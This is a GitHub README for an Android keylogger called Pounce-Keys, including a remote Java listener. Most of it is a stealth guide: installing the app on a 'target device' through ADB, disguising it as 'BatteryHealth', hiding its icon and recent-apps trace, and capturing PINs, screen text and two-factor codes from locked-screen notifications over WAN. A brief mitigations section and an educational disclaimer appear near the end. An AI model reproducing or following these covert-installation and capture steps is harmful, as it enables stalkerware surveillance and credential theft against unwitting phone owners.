![GitHub Repo stars](https://img.shields.io/github/stars/NullPounce/pounce-keys?style=social) 
![GitHub all releases](https://img.shields.io/github/downloads/NullPounce/Pounce-Keys/total) 
[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FNullPounce%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com)
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/NullPounce/Pounce-Keys) 
![GitHub](https://img.shields.io/github/license/NullPounce/Pounce-Keys) 
![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/NullPounce/Pounce-Keys)    


<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/NullPounce/pounce-keys">
    <img src="images/logo.png" alt="Logo" width="150" height="150">
  </a>

  <h3 align="center">POUNCE-KEYS</h3>

  <p align="center">
    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️ + advanced stealth guide
    <br />
    <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
    ·
    <a href="https://ko-fi.com/pounce">Support Me</a>
    ·
    <a href="https://github.com/NullPounce/pounce-keys/issues">Request Feature</a>
  </p>
</div>



  
 







✅ PASSED GOOGLE VIRUS SCAN

![demo](https://user-images.githubusercontent.com/28081004/216733696-e7d1c552-5884-46b2-82c9-5221f9ece36f.gif)




sorry for the low quality, 10mb gif size limit



# Update: changed my username and wont guide any more detailed custom stealth options (see recent update bellow in stealth section)
as much as I love working on this project, I need to find the time to do so.

TODO:
add tab for reddit, twitter, firefox
# Listener Features ![Linode](https://img.shields.io/badge/Supports-Linode-green)  ![Linode](https://img.shields.io/badge/Kali-Linux-blue)

✅ reads hidden notifications in locked state (grabs google code before owner sees it)

✅ grabs almost all text on the screen the user is looking at.

✅ works over WAN

✅ filtered tabs for different apps to reduce logs for easy reading (many revissions and re-compiles with many high filtered precise tweaks to make this work)

✅ 300+ lines of error free custom code 

✅ gets pin code

✅ auto scrolling

✅ works in windows and linux as a .exe, .java, and .jar

✅ asks user for ip and port with autofill (double check correct ip and port)

✅ cute cat icon 

✅ logs date and time AND SAVES THEM

# quick use


jdk19 

```
wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.deb

sudo apt-get -qqy install ./jdk-19_linux-x64_bin.deb

sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-19/bin/java 1919
```

```
git clone https://github.com/NullPounce/pounce-keys.git
cd pounce-keys/Listener/java
java -jar MessageListener.jar
sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's side
```




# STEALTH (tldr under this)
# I will make a full video showing how to build apk with any app name and icon then remotely install in place of old app) "if i get any support"
this would allow you to (after adb into device) delete apk thats never used, then replace with your own custom app, you could
delete a downloaded files app they dont use and build the keylogger to use the same name and icon, better yet i can show how to copy
malwarebytes service name! you can easily just ctrl+F the code in AS and edit the names and see where the icon goes.

TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiden icon in some cases
UPDATE: if all fails try long pressing the home screen to open launcher settings for a hide apps option.


1. have a device with adb setup in a terminal and run adb tcpip 5555 with a phone charger plugged in (also have the stealth apk ready in same dir)
2. make a new folder on the adb pc with this structure com.BatteryHealth/files/keys/fix.dat
3. in the fix.dat file you made, insert ip:port in line 1 and save (ip and port of remote device with pounce-keys listener, works in linode)
4. grab target device , open settings , enable dev options if need be then usb debugging
5. connect phone , tap always allow usb debug
6. run adb tcpip 5555 again and run adb install Stealth.apk (this hides from recent apps and settings sometimes does not even show as opened)
7. turn off usb debug and enable the accessibility service
8. copy and paste the com.BatteryHealth folder into android/data after turning on file tranfer

in android 9 and bellow this will install the app with no icon on the launcher or docked apps (wont even be on the screen, perioid)
only way you can see this is if you open accessibility settings or scroll all the way down in installed apps as its never a recent one.
10 and up this will add a shortut named ZbatteryHealth with no icon but will be seen in the launcher, move it to a folder or replace app name with \ in 
manifest file but this will make the app show in the top of installed

due to new security features android API 29 and above (Oreo and up I believe) it will make it hard to near impossible to hide the app without root.
The stealth version does not allow the app to be open, just a white icon, and it just opens the app details menu, sits in the app drawer.

In stealth, you must make and place your own fix.dat file in the app directory 
Android/data/com.BatteryHealth/files/key/fix.dat
after making fix.dat inside, add "192.168.0.135:4444"
without the quotes and replace IP and port with your own IP:PORT

this option has removed all words "keylogger" and "malware" from UI and code as well as folders and hides the app 100% except settings installed list in
android BELLOW Oreo, API 29 and up it will just open app info not showing the IP port field

![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png) ![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)





# NORMAL INSTALL

open the app and just place your IP:PORT and tap send (the ip of the device you will listen on)
you may need to open settings/apps/app-name then tap 3 dots top right and allow special permissions
make sure where you got the file from via web browser and or file manager has access,ES works if you have problems
open accessibility settings and enable keylogger or BatteryHealth
no manual fix.dat required



# Stealth install tldr

![stealth_install](https://user-images.githubusercontent.com/28081004/215221291-f4a05ea5-448d-4b1d-ade3-8bec23c53a70.gif)

create a file named fix.dat and copy and PASTE it into android/data/com.BatteryHealth/files/key/
insert ip and port of machine with java listener IP:port







# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! 
Use Pounce_keys in your dev workflow to assure your app is protected by keyloggers, this is a must for banking apps and yes some are vulnerable!
Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages.


# dev
make a new android studio project, empty
file, open downloaded extracted project in new window
right click on each project to open each in file explorer
in you're new project open app\src\main and delete 
copy over the rev, java, main files from the forked project over to this folder
![Screenshot 2023-01-21 180954](https://user-images.githubusercontent.com/28081004/213893930-3418400c-9c51-4f36-ba56-bca8ffe9c223.png)

# mitigations

can I protect my passwords from this, even while hacked?
Open dev options and under privacy turn off show passwords when typed

how do I look for this

CHECK
accessibility settings for any downloaded services or if any are on (name don't matter)
hide apps section in launcher
for a fix.dat file in android/data/APP-NAME/files/key/fix.dat
installed apps section in settings, could show as a blank icon as ZBatteryHealth but this could be put in any apk (so rely on service list)




# Donate![icon](https://user-images.githubusercontent.com/28081004/214497772-e0d74e0c-66ca-4e1c-a88f-d0709b62890d.png)💜
thank you for the 12th star :)⭐ anysoft keyboard and malwarebytes has no issue with apk
adding a clear logs button may be in the future.




I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
android-keylogger tag :) java listener is 1 of a kind, original content without forks. Wow 12 stars! thank you guys so much, glad to announce WAN support.

If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!

<a href="https://www.buymeacoffee.com/NullPounce"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=NullPounce&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X6I1K9I)

# credits
forked from https://github.com/shivamsuyal/Android-Keylogger

icon "https://www.flaticon.com/free-icon/keylogger_8147179?term=keylogger&page=1&position=42&origin=search&related_id=8147179
https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=search
      
   https://www.freepik.com/free-vector/cute-cat-computer-with-mouse-cartoon-vector-icon-illustration-animal-technology-icon-concept-isolated-premium-vector-flat-cartoon-style_18537569.htm#query=cat%20keyboard&position=1&from_view=search&track=sph#position=1&query=cat%20keyboard
https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm

⚖️ Legal Disclaimer: For Educational Purpose Only

current setup is kali linux in linode with pounce-keys running on an open port using ufw to only allow certain ip's
then using realVNC on my phone wiht termux for a ssh connction to run vnc local to remote into kali and view logs on my phone
when i want to, then i have no machine to remote into a local pc with scrcpy for remote viwing and mobydroid for files and apks
